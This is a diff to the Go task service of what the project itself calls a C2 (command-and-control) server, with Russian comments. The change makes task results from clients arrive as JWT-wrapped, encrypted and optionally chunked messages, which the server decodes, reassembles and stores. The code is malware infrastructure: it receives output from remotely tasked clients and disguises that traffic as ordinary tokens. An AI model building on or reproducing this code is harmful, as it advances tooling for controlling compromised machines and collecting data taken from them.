@@ -3,11 +3,15 @@
 package service
 
 import (
+	"c2-project/internal/chunk"
+	"c2-project/internal/crypto"
+	"c2-project/internal/jwt"
 	"c2-project/internal/models"
 	"c2-project/internal/protocol"
 	"c2-project/internal/storage"
 	"encoding/json"
 	"errors"
+	"fmt"
 )
 
 // TaskService - сервис для работы с задачами.
@@ -67,25 +71,56 @@ func (s *TaskService) GetPendingTaskForClient(clientID string) (models.Task, str
 }
 
 // SaveTaskResult - сохраняет результат выполнения задачи.
-// Принимает зашифрованный токен с результатом.
+// Поддерживает как обычные сообщения, так и фрагментированные (чанки).
 func (s *TaskService) SaveTaskResult(token string) error {
-	// Декодируем результат
-	data, err := protocol.DecodeRequest(token)
+	// Декодируем JWT → получаем зашифрованные данные
+	encrypted, err := jwt.Decode(token)
 	if err != nil {
-		return err
+		return fmt.Errorf("jwt decode error: %w", err)
 	}
 
-	// Преобразуем в map
-	jsonData, err := json.Marshal(data)
+	// Расшифровываем → получаем исходные данные
+	decrypted, err := crypto.Decrypt(encrypted)
 	if err != nil {
-		return err
+		return fmt.Errorf("decryption error: %w", err)
 	}
 
+	// Проверяем, является ли это чанком
+	var c chunk.Chunk
+	if err := json.Unmarshal(decrypted, &c); err == nil && c.Type != "" {
+		// Это чанк — собираем данные
+		result, completed := chunk.Assemble(c)
+		if !completed {
+			// Чанк принят, но не полный
+			return nil
+		}
+
+		// Все чанки собраны — расшифровываем финальный результат
+		finalDecrypted, err := crypto.Decrypt(result)
+		if err != nil {
+			return fmt.Errorf("final decryption error: %w", err)
+		}
+
+		// Парсим JSON
+		var finalResult map[string]interface{}
+		if err := json.Unmarshal(finalDecrypted, &finalResult); err != nil {
+			return fmt.Errorf("json parse error: %w", err)
+		}
+
+		return s.saveFinalResult(finalResult)
+	}
+
+	// Обычное сообщение (не чанк)
 	var result map[string]interface{}
-	if err := json.Unmarshal(jsonData, &result); err != nil {
-		return err
+	if err := json.Unmarshal(decrypted, &result); err != nil {
+		return fmt.Errorf("json parse error: %w", err)
 	}
 
+	return s.saveFinalResult(result)
+}
+
+// saveFinalResult - сохраняет финальный результат в хранилище.
+func (s *TaskService) saveFinalResult(result map[string]interface{}) error {
 	taskID, _ := result["task_id"].(string)
 	output, _ := result["output"].(string)
 	status, _ := result["status"].(string)
@@ -94,7 +129,6 @@ func (s *TaskService) SaveTaskResult(token string) error {
 		return errors.New("missing task_id")
 	}
 
-	// Сохраняем результат
 	s.store.UpdateTaskResult(taskID, output, status)
 	return nil
 }
